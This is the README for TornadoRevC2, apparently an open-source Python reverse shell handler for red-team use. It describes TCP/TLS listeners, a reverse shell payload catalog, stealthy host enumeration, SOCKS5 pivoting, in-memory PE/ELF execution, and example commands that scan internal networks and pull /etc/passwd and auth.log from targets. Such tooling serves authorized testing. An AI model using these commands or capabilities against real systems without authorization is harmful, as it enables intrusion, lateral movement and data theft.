# TORNADOREVC2 — Professional Reverse Shell Handler
TornadoRevC2 is a professional, universal reverse shell handler written in Python. It is not a full C2 framework, but a highly capable reverse shell handler that combines rock-solid shell handling with selected C2 style management features.

**Supported target platforms:** Linux and Windows (primary), plus generic Unix/BSD compatibility where practical.

## ⚠️ Legal Disclaimer
This project is provided strictly for educational purposes, academic research, malware analysis, red-team laboratories, and authorized pentest. By using this software, you agree that:
- You will only deploy, execute, or test this tool on systems you own or systems for which you have received explicit, written authorization from the owner.
- You accept full responsibility for how this software is used, including compliance with all applicable local, national, and international laws.
- The author and contributors assume no liability for any misuse, damage, data loss, or legal consequences arising from the use of this software.

## What TornadoRevC2 is and is Not
### It is:
- A universal reverse shell handler
- A multi-client, multi-protocol shell receiver
- A combined TCP + TLS reverse shell server
- A fully interactive terminal
- A dynamic reverse shell payload reference

### It is not:
- Not a beacon-based C2
- Not a post-exploitation framework
- No persistence, implants, or automated tasking

## Project Structure
```
tornadorevc2/
  constants.py    # Shared constants and command lists
  sysinfo.py      # Host information collection and display
  session_log.py  # Per-session directory logging
  terminal_sanitize.py  # Strip control sequences from logged/exported output
  terminal.py     # PTY/TTY, resize, and signal handling
  transfer.py     # Chunked file transfers with resume support
  payload_exec.py # In-memory payload transfer and execution
  clipboard.py    # Remote clipboard read
  tunnel.py       # SOCKS5 internal network pivoting
  session_registry.py  # Session persistence and reconnect support
  export.py         # HTML transcript report generation
  payloads.py       # Dynamic payload catalog
  handler.py      # Main server and session logic
tornadorevc2.py   # Entry point
```

## Core Features
### Dual TCP & TLS Reverse Shell Listener
TornadoRevC2 runs TCP and TLS reverse shell listeners at the same time, allowing it to handle both plaintext and encrypted reverse shells from a single handler.
- Plain TCP and TLS encrypted listeners
- Separate ports for each protocol
- Supports high numbers of concurrent connections
- TLS connection uses strong ciphers and enforces TLS 1.2+ for secure shells against MITM or downgrade attacks by blue teams

### Universal Reverse Shell Compatibility
Handles most reverse shell types (TCP, TLS, UNIX, Windows, PTY, unstable shells) without assumptions about the target.

### Dynamic Payload Arsenal
TornadoRevC2 includes a large, categorized reverse shell payload list.
- Payloads are originally sourced from revshells.com
- Each payload has been manually reviewed, rewritten, and adapted for this project
- Host and port values are injected dynamically from server's configuration
- Payloads automatically update when listener settings change

This allows rapid deployment without editing payloads manually during operations.

### Manual Host Information Collection
TornadoRevC2 collects host information **only when the operator explicitly executes the `sysinfo` command**, providing better operational stealth by avoiding automatic enumeration when a new session connects.
* Works on Linux, Unix, and Windows targets via inline Python/shell (Unix) or PowerShell (Windows)
* Executed only on demand through the `sysinfo` command
* **Stealth mode (default):** minimal process footprint; stdlib and `/proc` on Linux; essential fields only
* **Full mode (`--full`):** complete dataset with external utilities when needed
* Updates the session object with the latest host information
* Displays the results in grouped sections and saves them to the session log directory for later reference

Collected fields are organized into five sections when displayed:

| Section | Linux / Unix | Windows |
|---------|----------------------|---------|
| **Identity** | hostname, FQDN, username, home, shell, UID/GID, root status | hostname, FQDN, username, domain, home, admin status, logged-on user |
| **System** | OS, release, version, kernel, architecture, platform | OS, release, build, architecture, platform, manufacturer, model, domain-joined, system directory |
| **Resources** | CPU count, memory, disk (CWD drive), uptime | CPU name/count, memory, disk (current drive), uptime |
| **Network** | IP addresses, timezone, locale | IP addresses, timezone, locale |
| **Session** | CWD, PID, Python version | CWD, PID, PowerShell version |

On Linux and Unix targets without Python available, a lightweight shell fallback still returns hostname, username, OS, and CWD.

### Advanced Multi-Client Session Handling
- Handles multiple shells simultaneously
- Automatic unique session ID assignment
- Live session status tracking with host/user/OS details
- Safe disconnect detection
- Thread-safe client management
- **Session persistence:** metadata preserved on disconnect; restored when the same client reconnects
- **Stable fingerprinting:** hostname, username, persistent machine ID (`/etc/machine-id` or Windows `MachineGuid`), and shell type
- **`sessions` / `reconnects` commands** for registry and reconnect history

### Internal Network Pivoting (SOCKS5)
Route operator tools through a connected session to reach internal hosts on the target network.
- **SOCKS5 proxy:** pivot through a session with proxychains, Nmap, Impacket, NetExec, browsers, RDP clients, and similar tools
- Multiple simultaneous SOCKS proxies with unique IDs
- Remote tunnel agent deployed in-memory on first use (Python on target)
- Proxies auto-stop on session disconnect

| Command | Description |
|---------|-------------|
| `socks <ID> <listen_port>` | Start SOCKS5 proxy via session |
| `tunnels` | List active SOCKS proxies |
| `socks stop <proxy_id>` | Stop a SOCKS proxy |

Inside a client shell, omit `<ID>`: `socks 1080`.

Example:
```bash
# SOCKS5 proxy for internal network access via session 1
socks 1 1080

# Use with external tools
proxychains nmap -sT -Pn 10.10.10.0/24
curl --socks5 127.0.0.1:1080 http://internal-server/
xfreerdp /v:dc01.corp.local /u:user /p:pass /proxy:socks5://127.0.0.1:1080
```

### Session Reconnect Support
When a session drops and the same host reconnects, TornadoRevC2 restores:
- Session ID, custom name, and sysinfo cache
- Existing log directory (commands append to the same `session.log`)
- Connect count and fingerprint tracking

On connect, a lightweight stealth identity probe reads hostname, username, and the system machine identifier (`/etc/machine-id` on Linux/Unix, `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` on Windows). These values are hashed into a stable fingerprint used for automatic session matching and reconnect detection.

Registry stored at `logs/.registry/sessions.json`. Reconnect events appear in the console and session log.

### Session Transcript Export
Generate clean, self-contained HTML reports for documentation or pentest deliverables.
- **`export <ID>`** from the main menu exports the selected session transcript
- Works for **active** and **disconnected** sessions tracked in the registry
- Report includes session metadata and the full command/output log in chronological order
- Saved under `exports/` as `session_<ID>_<YYYY-MM-DD>.html`
- Command output in logs and exports is **sanitized** before being written: ANSI escape sequences, OSC sequences (terminal titles, shell integration metadata), and bracketed-paste control codes are stripped so transcripts contain only readable command output

Report fields include session ID, hostname, username, OS, architecture, IP address, protocol, connection/disconnection times, and the complete transcript.

Example:
```bash
export 3
# exports/session_3_2026-08-11.html
```

### Fully Interactive Operator Terminal
- Real interactive shell per client
- Clean, colorized prompts with `user@hostname` context when available
- Context aware session identification
- Background sessions without termination
- Instant switching between shells
- Individual shell termination

### Platform Detection & Smart Upgrades
- Automatic OS inference:
  - Linux (primary)
  - Unix / BSD (generic compatibility)
  - Windows (primary)
- UNIX shells are auto-upgraded to PTY-backed interactive shells
- Windows PowerShell sessions receive automatic tuning
- Improves usability without operator intervention

### Enhanced Terminal Handling
Interactive shells receive improved PTY/TTY support for a better operator experience.
- **PTY upgrade:** Unix sessions are upgraded with `TERM=xterm-256color`, `stty` sizing, and PTY-backed shells
- **Terminal resize:** Operator terminal resizes are propagated to the remote shell (`SIGWINCH` on Unix)
- **Signal handling:** First `Ctrl+C` sends an interrupt to the remote process; a second `Ctrl+C` returns to the main menu

### Stability & Reliability
- Non-blocking socket I/O (`select`)
- Adaptive read timeouts
- Graceful handling of unstable shells
- Automatic cleanup on disconnect
- Designed for long-running handler use

### Operator Commands

| Command | Description |
|---------|-------------|
| `status` / `ls` | Show active reverse shell sessions |
| `sessions` | Show tracked sessions (active + awaiting reconnect) |
| `reconnects` | Show session reconnect history |
| `switch <ID>` | Interact with a specific shell |
| `kill <ID>` | Terminate a shell session |
| `sysinfo <ID> [--stealth\|--full]` | Refresh and display host information (default: stealth) |
| `runpy/runps/runexe/runelf <ID> <local>` | Transfer and execute payload in memory |
| `clipboard <ID>` | Read remote clipboard text |
| `rename` / `rn <ID> <name>` | Rename a session |
| `payloads` | Display the payload list |
| `clear` / `cls` | Clear screen |
| `help` | Show help menu |
| `exit` / `quit` | Shut down the handler |
| `upload [--resume] <ID> <local> <remote>` | Chunked upload with SHA256 verify |
| `download [--resume] <ID> <remote> <local>` | Chunked download with SHA256 verify |
| `verify/hash <ID> <remote>` | Check remote file size and SHA256 |
| `socks <ID> <listen_port>` | SOCKS5 proxy for internal pivoting |
| `tunnels` | List active SOCKS proxies |
| `socks stop <proxy_id>` | Stop a SOCKS proxy |
| `export <ID>` | Export HTML session transcript report |

Inside a client shell (`switch <ID>`), omit the session ID for file transfer and session commands.

| Command | Description |
|---------|-------------|
| `sysinfo [--stealth\|--full]` | Refresh and display host information (default: stealth) |
| `runpy <local.py>` | Execute Python script in memory |
| `runps <local.ps1>` | Execute PowerShell script in memory |
| `runexe <local.exe> [-- args]` | Execute Windows PE in memory (reflective loader + fallback) |
| `runelf <local_binary> [-- args]` | Execute Linux ELF via memfd_create/fexecve |
| `clipboard` | Read remote clipboard text |
| `upload [--resume] <local> <remote>` | Push a local file to the target |
| `download [--resume] <remote> <local>` | Pull a remote file to the operator |
| `verify` / `hash <remote>` | Show remote file size and SHA256 |
| `socks <listen_port>` | SOCKS5 proxy for internal pivoting |
| `tunnels` | List active SOCKS proxies |
| `socks stop <proxy_id>` | Stop SOCKS proxy |
| `help` | Show client-shell help |
| `exit(e)` / `quit(q)` | Return to the main menu |

### Per-Session Logging
Every session gets its own dedicated directory under `logs/`, named after the session (ID, user, hostname, IP, OS, and timestamp).

```
logs/001_user@hostname_192.168.1.10_unix_10-08-2026_143022/
  session.log      # Every command and its output
  sysinfo.json     # Host information snapshot
  transfers/       # Upload/download event logs
  executions/      # In-memory payload execution metadata
```

- Commands and output are appended to `session.log` in real time
- Terminal control sequences (ANSI colors, OSC titles, shell integration metadata, bracketed-paste codes, etc.) are stripped from logged command output; the live interactive terminal is unaffected
- Initial and refreshed `sysinfo` data is saved to `sysinfo.json` (identity, system, resources, network, and session fields)
- Transfer results (complete, interrupted, hash mismatch) are logged under `transfers/`
- Payload execution metadata (name, type, hash, runtime, success/failure) is logged under `executions/` — payload contents are not logged
- Clipboard operations are recorded in `session.log`
- Session connect and disconnect events are recorded automatically

Exported HTML reports are written separately under `exports/` and do not modify session logs.

### In-Memory Payload Execution
Execute scripts and binaries on the target without persistent disk artifacts whenever technically possible.
- **Python (`.py`):** `exec()` via `python -c` after chunked transfer and SHA256 verification
- **PowerShell (`.ps1`):** encoded/inline invocation after in-memory assembly
- **Windows PE (`.exe`):** reflective in-memory loader via PowerShell C# stub; graceful temp-file fallback with stdout/stderr capture
- **Linux ELF:** `memfd_create` + execution from `/proc/self/fd/`; `/dev/shm` fallback
- Chunked transfer reuses the existing shell channel infrastructure
- Supports `--save-output <file>` and `--` for command-line arguments (binaries)
- Available from the main menu (with session ID) or inside a client shell

### Remote Clipboard Interaction
Read the remote desktop clipboard when a graphical session is available.
- **Linux:** `wl-clipboard`, `xclip`, and `xsel` (auto-detected)
- **Windows:** PowerShell / WinForms clipboard APIs
- Graceful errors on headless systems or missing utilities
- Operations logged to the session directory

### Sysinfo Stealth and Full Modes
| Mode | Flag | Behavior |
|------|------|----------|
| Stealth (default) | `--stealth` | Minimal processes; stdlib + `/proc`; hostname, user, OS, arch, CWD, PID, IPs |
| Full | `--full` | Complete enumeration (identity, system, resources, network, session) |

### Chunked File Upload & Download
Transfer files to and from connected sessions without leaving the handler.
- Platform-aware chunk sizes (32 KB Unix, 4 KB Windows)
- Works over existing reverse shell channels (TCP/TLS)
- Upload from operator machine to remote target
- Download from remote target to operator machine
- Commands available from main menu (with session ID) or inside a client shell

| Command | Description |
|---------|-------------|
| `upload [--resume] <ID> <local> <remote>` | Push a local file to the target |
| `download [--resume] <ID> <remote> <local>` | Pull a remote file to the operator |
| `verify` / `hash <ID> <remote>` | Show remote file size and SHA256 |

Inside a client shell (`switch <ID>`), omit the ID: `upload`, `download`, `verify`.

### Resumable File Transfers
Interrupted uploads and downloads can be resumed without starting over.
- Use `--resume` or `-r` to continue from the last successful offset
- Progress is tracked in a local `.tornado_<hash>.tornado_xfer.state` file beside the local path
- On failure, the handler prints the exact resume command to run
- Resume validates file size and SHA256 metadata before continuing
- Stale or mismatched state files are ignored automatically

Examples:
```bash
# Main menu
upload --resume 1 ./payload.bin C:\Users\Public\payload.bin
download --resume 1 /etc/passwd ./passwd

# Inside a client shell
upload --resume ./local.bin /tmp/local.bin
download --resume /var/log/auth.log ./auth.log
```

### File Integrity Verification
Every upload and download is verified end-to-end with SHA256.
- Local hash computed before upload; remote hash verified after
- Remote hash fetched before download; local hash verified after
- Mismatch reports both hashes for manual inspection
- Standalone `verify` / `hash` command for remote file checks

### File Transfer Progress Indicators
Live progress feedback during transfers:
- ASCII progress bar with percentage
- Transferred / total size display
- Transfer rate (bytes per second)
- Estimated time remaining (ETA)

## Usage
```bash
python tornadorevc2.py
python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 -c server.pem -k server.key
```

## TLS Certificate Generation
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -nodes \
  -days 3650 \
  -keyout server.key \
  -out server.pem
```

## Changelog
- Session Log and Export Control-Sequence Sanitization (Added)
- Session Transcript HTML Export (Added)
- SOCKS5 Internal Network Pivoting (Added)
- Session Persistence and Reconnect Support (Added)
- In-Memory Payload Execution (Added)
- Remote Clipboard Interaction (Added)
- Sysinfo Stealth and Full Modes (Added)
- Expanded Host Information Collection (Added)
- Session Renaming (Added)
- Chunked File Upload & Download (Added)
- File Integrity Verification (Added)
- File Transfer Progress Indicators (Added)
- `sysinfo`, `download`, `upload`, `verify/hash` Commands (Added)
- Enhanced PTY/TTY Terminal Handling (Added)
- Per-Session Directory Logging (Added)
- Resumable File Transfers (Added)
- Modular Package Structure (Added)
